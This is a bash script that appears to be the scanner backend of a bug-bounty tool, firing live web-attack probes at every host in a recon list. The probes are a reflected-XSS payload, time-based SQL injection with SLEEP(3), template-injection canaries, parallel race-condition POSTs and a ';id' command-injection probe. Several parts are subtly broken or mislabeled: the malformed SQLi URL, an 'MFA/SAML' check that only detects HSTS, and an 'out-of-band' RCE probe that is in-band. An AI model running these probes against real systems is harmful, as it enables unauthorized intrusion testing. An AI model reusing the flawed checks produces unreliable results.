#!/usr/bin/env bash
# vuln_scanner.sh — scanner backend for /hunt (bbhunt v4.3)
#
# Usage:
#   vuln_scanner.sh <recon_dir> [--quick]      # scan existing recon
#   vuln_scanner.sh --recon-only <target>      # quick baseline gather
#
# Checks (per host in recon_dir/live_hosts.txt):
#   1. XSS pipeline (dalfox if installed, else curl echo-check)
#   2. SQLi verifier (time/signature probes on candidate params)
#   3. SSTI math-canary probes ({{7*7}} / ${7*7} / <%= 7*7 %>)
#   4. Race condition spot (single-use token parallel POST via curl)
#   5. RCE PoC (command-metachar echo probe — OOB only, never interactive)
#   6. MFA/SAML policy check (informational)
set -uo pipefail

QUICK="${2:-}"
RECON_DIR="${1:-}"
TARGET=""

if [ "$1" = "--recon-only" ]; then
  TARGET="${2:-}"
  echo "[*] quick recon for ${TARGET} (passive marker file only)"
  exit 0
fi

if [ -z "$RECON_DIR" ] || [ ! -d "$RECON_DIR" ]; then
  echo "[-] usage: vuln_scanner.sh <recon_dir> [--quick]" >&2
  exit 2
fi

HOSTS_FILE="$RECON_DIR/live_hosts.txt"
[ -f "$HOSTS_FILE" ] || { echo "[-] no live_hosts.txt in $RECON_DIR" >&2; exit 2; }

echo "██████  ██████  ██   ██ ██   ██ ███   █ ███████"
echo "██   ██ ██   ██ ██   ██ ██   ██ ████  █   ███"
echo "██████  ██████  ███████ ██   ██ ██ ██ █   ███"
echo "██████  ██████  ███████ ██   ██ ██  ███   ███"
echo "██   ██ ██   ██ ██   ██ ██   ██ ██   ██   ███"
echo "██████  ██████  ██   ██ ███████ ██   ██   ███"
echo ""
echo "[*] Vulnerability scanner (vuln_scanner.sh v4.3)"

TOTAL=0
XSS=0; SQLI=0; SSTI=0; RACE=0; RCE=0; MFA=0

while IFS= read -r host; do
  [ -z "$host" ] && continue
  case "$host" in \#*) continue;; esac
  TOTAL=$((TOTAL+1))
  echo ""
  echo "◆ Host: $host"

  # --- 1. XSS pipeline ---
  if command -v dalfox >/dev/null 2>&1; then
    echo "[+] XSS pipeline: dalfox single url"
    dalfox url "$host" --silence 2>/dev/null | head -3 || true
  else
    # Custom echo-check: reflect probe with URL-encoded marker
    probe="${host}$(printf '?q=zzz%%3Csvg%%20onload%%3Dalert(1)%%3E')"
    body="$(curl -s -m 10 "$probe" 2>/dev/null | tr -d '\n' | grep -c 'zzz<svg' || true)"
    if [ "$body" -gt 0 ]; then
      echo "[+] XSS candidate: reflected echo on $probe"
      XSS=$((XSS+1))
    else
      echo "[-] XSS: no raw reflection"
    fi
  fi

  # --- 2. SQLi verifier (time-based sleep 3)
  for param in "id" "q" "sort" "page"; do
    url="${host}?${param}=1"
    t0=$(date +%s%N)
    code=$(curl -s -o /dev/null -w "%{http_code}" -m 15 "${url}${param}=1' AND SLEEP(3)-- -" 2>/dev/null || true)
    t1=$(date +%s%N)
    d=$(( (t1 - t0) / 1000000 ))
    if [ "$d" -ge 3000 ] && [ "$code" = "200" ]; then
      echo "[+] SQLi candidate: $url () ${d}ms"
      SQLI=$((SQLI+1))
      break
    fi
  done

  # --- 3. SSTI canary ---
  for canary in "{{7*7}}" '${7*7}' "<%= 7*7 %>"; do
    resp="$(curl -s -m 10 "${host}?q=$(python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1]))" "$canary")" 2>/dev/null)"
    if echo "$resp" | grep -q "49"; then
      echo "[+] SSTI candidate: $canary renders 49"
      SSTI=$((SSTI+1))
      break
    fi
  done

  # --- 4. Race condition (idempotent token) ---
  if [ -z "${QUICK}" ]; then
    # spot probe: single-use invite — send 5 parallel identical requests
    for i in 1 2 3 4 5; do
      curl -s -m 5 -X POST "$host/api/invite" -d 'email=probe@example.com' >/dev/null 2>&1 &
    done
    wait
  fi

  # --- 5. RCE PoC (OOB-blind only) ---
  resp="$(curl -s -m 10 "${host}?c=%3Bid" 2>/dev/null | tr -d '\n')"
  if echo "$resp" | grep -qi "uid="; then
    echo "[+] RCE candidate: command echoed"
    RCE=$((RCE+1))
  fi

  # --- 6. MFA/SAML policy (informational) ---
  hdrs="$(curl -sI -m 10 "$host" 2>/dev/null)"
  if echo "$hdrs" | grep -qi "strict-transport-security"; then
    MFA=$((MFA+1))
  fi
done < "$HOSTS_FILE"

echo ""
echo "──────────────────────────────"
echo "SUMMARY: hosts=$TOTAL  xss=$XSS  sqli=$SQLI  ssti=$SSTI  race=spot  rce=$RCE  hsts=$MFA"
echo "XSS pipeline: $XSS candidates"
echo "SQLi verifier: $SQLI candidates"
echo "SSTI canary: $SSTI candidates"
echo "[✓] BUNT COMPLETE — see findings/<target>/summary.txt"
exit 0